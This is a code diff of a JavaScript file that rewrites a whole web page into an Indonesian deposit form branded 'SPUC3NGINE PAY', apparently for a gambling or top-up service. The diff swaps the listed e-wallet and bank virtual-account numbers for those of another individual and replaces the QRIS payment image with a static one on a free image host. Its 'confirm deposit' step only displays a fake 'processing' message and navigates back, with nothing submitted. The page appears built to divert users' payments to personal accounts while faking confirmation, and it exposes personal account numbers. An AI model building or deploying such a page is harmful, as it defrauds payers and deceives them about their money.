@@ -20,224 +20,370 @@
   document.head.innerHTML = `
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Formulir Deposit</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <title>SPUC3NGINE PAY - Formulir Deposit</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet">
     <style>
+      :root {
+        --bg-main: #060814;
+        --bg-card: rgba(15, 23, 42, 0.75);
+        --primary: #00f0ff;
+        --secondary: #9d4edd;
+        --success: #00f5d4;
+        --text: #e2e8f0;
+        --border: rgba(0, 240, 255, 0.15);
+      }
+
       body {
-        margin:0;
-        font-family:'Poppins',sans-serif;
-        background:#0f172a;
-        color:#f1f5f9;
-        display:flex;
-        justify-content:center;
-        align-items:center;
-        min-height:100vh;
-        padding:0;
+        margin: 0;
+        font-family: 'Rajdhani', sans-serif;
+        background: radial-gradient(circle at center, #111430 0%, var(--bg-main) 100%);
+        color: var(--text);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        padding: 20px 0;
+        box-sizing: border-box;
+        overflow-x: hidden;
       }
+
       .container {
-        max-width:480px;
-        width:90%;
-        background:#1e293b;
-        border-radius:16px;
-        box-shadow:0 8px 32px rgba(0,0,0,.5);
-        padding:20px;
-        display:flex;
-        flex-direction:column;
-        align-items:center;
+        max-width: 450px;
+        width: 90%;
+        background: var(--bg-card);
+        backdrop-filter: blur(12px);
+        -webkit-backdrop-filter: blur(12px);
+        border-radius: 24px;
+        border: 1px solid var(--border);
+        box-shadow: 0 0 40px rgba(0, 240, 255, 0.1), inset 0 0 20px rgba(255, 255, 255, 0.02);
+        padding: 30px 24px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        position: relative;
+        animation: fadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
       }
-      h1 {
-        text-align:center;
-        font-size:22px;
-        margin:0 0 12px;
-        font-weight:700;
-        color:#38bdf8;
+
+      @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
       }
+
+      .logo-area {
+        font-family: 'Orbitron', sans-serif;
+        font-size: 24px;
+        font-weight: 700;
+        text-align: center;
+        letter-spacing: 2px;
+        background: linear-gradient(90deg, var(--primary), var(--secondary));
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        text-shadow: 0 0 20px rgba(0, 240, 255, 0.3);
+        margin-bottom: 4px;
+      }
+
+      .subtitle {
+        font-size: 14px;
+        color: #64748b;
+        letter-spacing: 4px;
+        text-transform: uppercase;
+        margin-bottom: 20px;
+        font-weight: 600;
+      }
+
       .marquee {
-        width:100%;
-        overflow:hidden;
-        white-space:nowrap;
-        box-sizing:border-box;
-        color:#fbbf24;
-        margin-bottom:12px;
+        width: 100%;
+        overflow: hidden;
+        white-space: nowrap;
+        background: rgba(251, 191, 36, 0.06);
+        border: 1px dashed rgba(251, 191, 36, 0.3);
+        border-radius: 8px;
+        padding: 8px;
+        color: #fbbf24;
+        margin-bottom: 20px;
+        font-size: 13px;
+        box-sizing: border-box;
       }
+
       .marquee span {
-        display:inline-block;
-        padding-left:100%;
-        animation:marquee 12s linear infinite;
+        display: inline-block;
+        padding-left: 100%;
+        animation: marquee 20s linear infinite;
       }
+
       @keyframes marquee {
         0% { transform: translateX(0%); }
         100% { transform: translateX(-100%); }
       }
+
       .actions {
-        display:flex;
-        gap:8px;
-        justify-content:center;
-        margin-bottom:12px;
-        flex-wrap:wrap;
-        width:100%;
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 10px;
+        width: 100%;
+        margin-bottom: 20px;
       }
-      button {
-        flex:1;
-        background:#38bdf8;
-        color:#0f172a;
-        border:none;
-        padding:10px;
-        border-radius:8px;
-        font-weight:600;
-        cursor:pointer;
-        transition:background .2s, transform .1s;
+
+      .actions button {
+        grid-column: span 1;
       }
-      button:hover { background:#0ea5e9; transform:scale(1.03); }
-      button.secondary { background:#4ade80; }
-      button.secondary:hover { background:#22c55e; }
+
       button.help {
-        background: linear-gradient(90deg, #ffb300, #ffa000);
-        color: #fff;
+        grid-column: span 2;
+        background: transparent !important;
+        border: 1px solid rgba(255,255,255,0.15) !important;
+        color: #94a3b8 !important;
+        margin-top: 4px;
       }
       button.help:hover {
-        background: linear-gradient(90deg, #ffa000, #ff8f00);
+        background: rgba(255,255,255,0.05) !important;
+        color: #fff !important;
+        box-shadow: none !important;
       }
-      select,input {
-        width:100%;
-        margin-top:8px;
-        padding:10px;
-        border:1px solid #334155;
-        border-radius:8px;
-        font-size:14px;
-        background:#0f172a;
-        color:#f1f5f9;
+
+      button {
+        width: 100%;
+        background: linear-gradient(135deg, #00b4d8, var(--primary));
+        color: #060814;
+        border: none;
+        padding: 12px 16px;
+        border-radius: 12px;
+        font-family: 'Rajdhani', sans-serif;
+        font-size: 16px;
+        font-weight: 700;
+        text-transform: uppercase;
+        cursor: pointer;
+        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        box-shadow: 0 4px 15px rgba(0, 240, 255, 0.2);
       }
+
+      button:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 6px 20px rgba(0, 240, 255, 0.4);
+        filter: brightness(1.1);
+      }
+
+      button:active { transform: translateY(0); }
+
+      button.secondary {
+        background: linear-gradient(135deg, var(--secondary), #7209b7);
+        color: #fff;
+        box-shadow: 0 4px 15px rgba(157, 78, 221, 0.2);
+      }
+      button.secondary:hover {
+        box-shadow: 0 6px 20px rgba(157, 78, 221, 0.4);
+      }
+
+      select, input {
+        width: 100%;
+        padding: 12px 16px;
+        border: 1px solid var(--border);
+        border-radius: 12px;
+        font-size: 15px;
+        background: #090d22;
+        color: #fff;
+        font-family: 'Rajdhani', sans-serif;
+        box-sizing: border-box;
+        transition: all 0.3s;
+        margin-bottom: 12px;
+      }
+
+      select:focus, input:focus {
+        outline: none;
+        border-color: var(--primary);
+        box-shadow: 0 0 10px rgba(0, 240, 255, 0.2);
+      }
+
+      .content-panel {
+        width: 100%;
+        animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+      }
+
+      @keyframes slideUp {
+        from { opacity: 0; transform: translateY(10px); }
+        to { opacity: 1; transform: translateY(0); }
+      }
+
       .bank-info {
-        margin-top:10px;
-        background:#0f172a;
-        padding:10px;
-        border-radius:8px;
-        text-align:left;
-        display:flex;
-        flex-direction:column;
-        gap:8px;
-        border:1px solid #334155;
+        background: rgba(9, 13, 34, 0.6);
+        padding: 16px;
+        border-radius: 16px;
+        border: 1px solid var(--border);
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        margin-bottom: 12px;
       }
-      .bank-info img { width:64px;height:64px;object-fit:contain;margin:0 auto; }
+
+      .bank-header {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      }
+
+      .bank-info img {
+        width: 45px;
+        height: 45px;
+        object-fit: contain;
+        background: #fff;
+        padding: 4px;
+        border-radius: 8px;
+      }
+
+      .bank-meta { flex: 1; }
+      .bank-meta b { font-size: 18px; color: var(--primary); }
+      .bank-meta small { color: #94a3b8; font-size: 13px; display: block; margin-top: 2px; }
+
       .bank-number {
-        display:flex;
-        align-items:center;
-        justify-content:space-between;
-        background:#1e293b;
-        padding:6px 10px;
-        border-radius:6px;
-        border:1px solid #334155;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        background: #050714;
+        padding: 10px 14px;
+        border-radius: 10px;
+        border: 1px solid rgba(255,255,255,0.05);
       }
+
+      .bank-number span {
+        font-family: 'Orbitron', sans-serif;
+        font-size: 15px;
+        letter-spacing: 1px;
+        color: #fff;
+      }
+
       .copy-btn {
-        background:#38bdf8;
-        color:#0f172a;
-        border:none;
-        padding:6px 10px;
-        border-radius:6px;
-        cursor:pointer;
-        font-size:13px;
-        margin-left:10px;
+        width: auto;
+        padding: 6px 14px;
+        font-size: 13px;
+        border-radius: 6px;
+        box-shadow: none;
       }
-      .result-area { text-align:center;margin-top:12px }
-      .qr-card img { width:220px;height:220px;border-radius:10px }
+
+      .result-area {
+        text-align: center;
+        margin-top: 15px;
+        animation: fadeIn 0.3s ease;
+      }
+
+      .qr-card {
+        background: #fff;
+        padding: 14px;
+        border-radius: 16px;
+        display: inline-block;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      }
+      .qr-card img { width: 200px; height: 200px; display: block; }
+
       .qr-buttons {
-        display:flex;
-        flex-direction:column;
-        gap:8px;
-        margin-top:10px;
-        width:100%;
+        display: flex;
+        gap: 10px;
+        margin-top: 15px;
+        width: 100%;
       }
-      .qr-buttons button {
-        border-radius:8px;
-        padding:10px;
-        font-weight:600;
-        cursor:pointer;
-      }
-      .download-btn {
-        background:#3b82f6;color:#fff;
-      }
-      .download-btn:hover {
-        background:#2563eb;
-      }
+      
       .done-btn {
-        background:#22c55e;color:#fff;
+        background: linear-gradient(135deg, #00f5d4, #01c7a9);
+        color: #060814;
+        box-shadow: 0 4px 15px rgba(0, 245, 212, 0.2);
       }
-      .done-btn:hover {
-        background:#16a34a;
-      }
+      .done-btn:hover { box-shadow: 0 6px 20px rgba(0, 245, 212, 0.4); }
+
       .spinner {
-        width:36px;height:36px;border:4px solid #334155;border-top:4px solid #38bdf8;border-radius:50%;animation:spin 1s linear infinite;margin:12px auto;
+        width: 40px;
+        height: 40px;
+        border: 3px solid rgba(0, 240, 255, 0.1);
+        border-top: 3px solid var(--primary);
+        border-radius: 50%;
+        animation: spin 0.8s linear infinite;
+        margin: 20px auto;
       }
-      @keyframes spin { to { transform: rotate(360deg) } }
+      @keyframes spin { to { transform: rotate(360deg); } }
+
       .footer-img {
-        margin-top:16px;
-        text-align:center;
+        margin-top: 24px;
+        text-align: center;
+        opacity: 0.5;
+        transition: opacity 0.3s;
       }
-      .footer-img img {
-        max-width:80%;
-        border-radius:8px;
-      }
+      .footer-img:hover { opacity: 0.8; }
+      .footer-img img { max-width: 60%; filter: grayscale(100%) brightness(200%); }
+
       .toast {
-        position:fixed;bottom:20px;left:50%;
-        transform:translateX(-50%) scale(0.95);
-        min-width:200px;text-align:center;
-        padding:10px 16px;border-radius:8px;
-        font-size:14px;font-weight:500;
-        opacity:0;pointer-events:none;
-        transition:opacity .3s,transform .3s;
-        z-index:9999;display:flex;align-items:center;gap:6px
+        position: fixed;
+        bottom: 30px;
+        left: 50%;
+        transform: translateX(-50%) scale(0.9);
+        min-width: 250px;
+        text-align: center;
+        padding: 12px 20px;
+        border-radius: 12px;
+        font-size: 15px;
+        font-weight: 600;
+        opacity: 0;
+        pointer-events: none;
+        transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        z-index: 9999;
+        font-family: 'Rajdhani', sans-serif;
+        box-shadow: 0 10px 25px rgba(0,0,0,0.4);
       }
-      .toast.show { opacity:1;transform:translateX(-50%) scale(1) }
-      .toast.success { background:#16a34a;color:#fff;box-shadow:0 4px 12px rgba(34,197,94,.3) }
-      .toast.error { background:#dc2626;color:#fff;box-shadow:0 4px 12px rgba(220,38,38,.3) }
+      .toast.show { opacity: 1; transform: translateX(-50%) scale(1); }
+      .toast.success { background: #00f5d4; color: #060814; }
+      .toast.error { background: #ff0055; color: #fff; }
     </style>
   `;
 
   document.body.innerHTML = `
     <div class="container">
-      <h1>Formulir Deposit</h1>
+      <div class="logo-area">SPUC3NGINE PAY</div>
+      <div class="subtitle">Secure Gateway</div>
+      
       <div class="marquee">
-        <span>Deposit wajib sesuai dengan yang ada di formulir deposit, Transaksi pertama Diwajibkan menggunakan Kode unik (contoh : 50.123), Jika tidak sesuai dengan syarat ketentuan, Deposit akan gagal proses</span>
-      </div>
-      <div class="actions">
-        <button onclick="showDeposit('manual')">Manual Deposit</button>
-        <button class="secondary" onclick="showDeposit('auto')">QRIS</button>
-        <!-- ✅ Tombol baru Bantuan Deposit -->
-        <button class="help" onclick="openHelp()">💬 Bantuan Deposit</button>
+        <span>⚠️ Deposit WAJIB sesuai nominal formulir! Transaksi pertama DIWAJIBKAN menggunakan Kode Unik (Contoh: 50.123). Jika melanggar syarat ketentuan, otomatis GAGAL PROSES.</span>
       </div>
 
-      <div id="manual-step" style="display:none;width:100%">
+      <div class="actions">
+        <button onclick="showDeposit('manual')">Manual Deposit</button>
+        <button class="secondary" onclick="showDeposit('auto')">Instant QRIS</button>
+        <button class="help" onclick="openHelp()">💬 Hubungi Bantuan Deposit</button>
+      </div>
+
+      <div id="manual-step" class="content-panel" style="display:none;">
         <select onchange="selectMethod(this.value)">
-          <option value="" selected disabled>Pilih Metode Deposit</option>
-          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgpSc_j6RrvzR4yXB3aJvMKum3-dbfqVJVwo_xCgZmnA&s=10","name":"Dana","number":"088214538915","owner":"SURWATI"}'>Dana</option>
-          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgL5miB0Nl0N4uXXxjG1DZtuV-0kgZ9Hlm_KvhVZ5cgA&s=10","name":"Ovo","number":"088905200893","owner":"ENJAH"}'>Ovo</option>
-          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSwXMKiiND-3i_R9jwcg3-gXBrxNEOGL3DEog&usqp=CAU","name":"BRI VA","number":"88810088214538915","owner":"SURWATI"}'>BRI VA</option>
-          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaeDt-esFy5TIN8gKVJhbFowRkxIDEep48aA&usqp=CAU","name":"BCA VA","number":"39358088905200893","owner":"ENJAH"}'>BCA VA</option>
-          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTt83cjvCmZBfU4uD-KIMRZFZIG5tbxEO25eg&usqp=CAU","name":"BNI VA","number":"8810088214538915","owner":"SURWATI"}'>BNI VA</option>
-          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQhHhAzPQYSQHan0-EHud0djSuTjQzstRV9zA&usqp=CAU","name":"MANDIRI VA","number":"60001088905200893","owner":"ENJAH"}'>MANDIRI VA</option>
+          <option value="" selected disabled>-- PILIH METODE DEPOSIT --</option>
+          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgpSc_j6RrvzR4yXB3aJvMKum3-dbfqVJVwo_xCgZmnA&s=10","name":"Dana","number":"085179820753","owner":"PUR**A ISM**L"}'>Dana</option>
+          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgL5miB0Nl0N4uXXxjG1DZtuV-0kgZ9Hlm_KvhVZ5cgA&s=10","name":"Ovo","number":"SCAN QRIS","owner":"SCAN QRIS"}'>Ovo</option>
+          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSwXMKiiND-3i_R9jwcg3-gXBrxNEOGL3DEog&usqp=CAU","name":"BRI VA","number":"8881085179820753","owner":"PUR**A ISM**L"}'>BRI VA</option>
+          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaeDt-esFy5TIN8gKVJhbFowRkxIDEep48aA&usqp=CAU","name":"BCA VA","number":"3935085179820753","owner":"PUR**A ISM**L"}'>BCA VA</option>
+          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTt83cjvCmZBfU4uD-KIMRZFZIG5tbxEO25eg&usqp=CAU","name":"BNI VA","number":"8810085179820753","owner":"PUR**A ISM**L"}'>BNI VA</option>
+          <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQhHhAzPQYSQHan0-EHud0djSuTjQzstRV9zA&usqp=CAU","name":"MANDIRI VA","number":"60001085179820753","owner":"PUR**A ISM**L"}'>MANDIRI VA</option>
         </select>
+        
         <div id="manual-details" class="bank-info" style="display:none">
-          <img id="bank-logo" src="" alt="Bank Logo">
-          <div><b id="bank-name"></b><br><small id="bank-owner"></small></div>
+          <div class="bank-header">
+            <img id="bank-logo" src="" alt="Bank Logo">
+            <div class="bank-meta">
+              <b id="bank-name"></b>
+              <small id="bank-owner"></small>
+            </div>
+          </div>
           <div class="bank-number">
             <span id="bank-number"></span>
             <button class="copy-btn" onclick="copyNumber()">Salin</button>
           </div>
-          <input id="manual-nominal" type="number" placeholder="Nominal min 50.000">
-          <button onclick="submitManualDeposit()" style="margin-top:6px">Kirim</button>
+          <input id="manual-nominal" type="number" placeholder="Nominal (Min. 50.000)">
+          <button onclick="submitManualDeposit()">Kirim Konfirmasi</button>
           <div id="manual-result"></div>
         </div>
       </div>
 
-      <div id="auto-deposit" style="display:none;width:100%">
-        <input id="nominal" type="number" placeholder="Nominal min 50.000">
-        <button onclick="generateQRIS()" style="margin-top:6px">Buat QRIS</button>
+      <div id="auto-deposit" class="content-panel" style="display:none;">
+        <input id="nominal" type="number" placeholder="Nominal (Min. 50.000)">
+        <button class="secondary" onclick="generateQRIS()">Buat QRIS Sekarang</button>
         <div id="auto-result" class="result-area"></div>
       </div>
 
       <div class="footer-img">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxt4SV-4Fwz_SHmJwW_ENA4zghNfwbYgAG4x_l9IbA0w&s=10" alt="Footer Image">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxt4SV-4Fwz_SHmJwW_ENA4zghNfwbYgAG4x_l9IbA0w&s=10" alt="Secure Payment Gate">
       </div>
     </div>
     <div id="toast" class="toast"></div>
@@ -251,66 +397,71 @@
   }
 
   window.showDeposit = function (type) {
-    document.getElementById("manual-step").style.display = type === "manual" ? "block" : "none";
-    document.getElementById("auto-deposit").style.display = type === "auto" ? "block" : "none";
+    const manualPanel = document.getElementById("manual-step");
+    const autoPanel = document.getElementById("auto-deposit");
+    
+    manualPanel.style.display = type === "manual" ? "block" : "none";
+    autoPanel.style.display = type === "auto" ? "block" : "none";
   };
 
   window.selectMethod = function (j) {
     if (!j) return;
     const m = JSON.parse(j);
-    document.getElementById("manual-details").style.display = "flex";
+    const details = document.getElementById("manual-details");
+    details.style.display = "flex";
     document.getElementById("bank-logo").src = m.logo;
     document.getElementById("bank-name").innerText = m.name;
     document.getElementById("bank-number").innerText = m.number;
-    document.getElementById("bank-owner").innerText = "a/n " + m.owner;
+    document.getElementById("bank-owner").innerText = "A/N: " + m.owner;
   };
 
   window.copyNumber = function () {
     const num = document.getElementById("bank-number").innerText;
     if (!num) return showToast("Nomor kosong!", "error");
-    navigator.clipboard.writeText(num).then(() => showToast("Nomor rekening disalin", "success"));
+    navigator.clipboard.writeText(num).then(() => showToast("⚡ Rekening Berhasil Disalin", "success"));
   };
 
   window.submitManualDeposit = function () {
     const n = Number(document.getElementById("manual-nominal").value || 0);
-    if (n < 50000) return showToast("Minimal deposit 50.000", "error");
+    if (n < 50000) return showToast("Minimal deposit Rp 50.000", "error");
     document.getElementById("manual-result").innerHTML = '<div class="spinner"></div>';
     setTimeout(() => {
-      document.getElementById("manual-result").innerHTML = "<strong>Deposit Diproses...</strong>";
+      document.getElementById("manual-result").innerHTML = "<div style='color:var(--success); font-weight:700; margin-top:10px;'>✓ DEPOSIT SEDANG DIPROSES SYSTEM</div>";
       setTimeout(() => history.back(), 1500);
     }, 1500);
   };
 
   window.generateQRIS = function () {
     const n = Number(document.getElementById("nominal").value || 0);
-    if (n < 50000) return showToast("Minimal 50.000", "error");
+    if (n < 50000) return showToast("Minimal Rp 50.000", "error");
     document.getElementById("auto-result").innerHTML = '<div class="spinner"></div>';
 
-    const qrUrl = "https://imagizer.imageshack.com/v2/320xq70/r/921/i0mH4i.jpg";
+    const qrUrl = "https://s13.gifyu.com/images/bdw1r.jpg";
 
-    document.getElementById("auto-result").innerHTML = `
-      <div class="qr-card">
-        <img id="qris-img" src="${qrUrl}" alt="QRIS">
-      </div>
-      <div class="qr-buttons">
-        <button class="download-btn" onclick="downloadQRIS()">Download QRIS</button>
-        <button class="done-btn" onclick="history.back()">Sudah Membayar</button>
-      </div>
-    `;
+    setTimeout(() => {
+      document.getElementById("auto-result").innerHTML = `
+        <div class="qr-card" style="animation: fadeIn 0.4s ease;">
+          <img id="qris-img" src="${qrUrl}" alt="QRIS">
+        </div>
+        <div class="qr-buttons">
+          <button style="background:#3b82f6; color:#fff; box-shadow:0 4px 12px rgba(59,130,246,0.3)" onclick="downloadQRIS()">Unduh QRIS</button>
+          <button class="done-btn" onclick="history.back()">Saya Sudah Bayar</button>
+        </div>
+      `;
+    }, 1000);
   };
 
   window.downloadQRIS = function () {
-    const qrUrl = "https://imagizer.imageshack.com/v2/320xq70/r/921/i0mH4i.jpg";
+    const qrUrl = "https://s13.gifyu.com/images/bdw1r.jpg";
     const link = document.createElement("a");
     link.href = qrUrl;
-    link.download = "qris.png";
+    link.download = "spuc3ngine-qris.png";
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
-    showToast("QRIS berhasil diunduh", "success");
+    showToast("✓ QRIS Berhasil Diunduh", "success");
   };
 
-  // ✅ Fungsi baru: tombol bantuan
   window.openHelp = function () {
     window.open("https://direct.lc.chat/19347249", "_blank");
   };
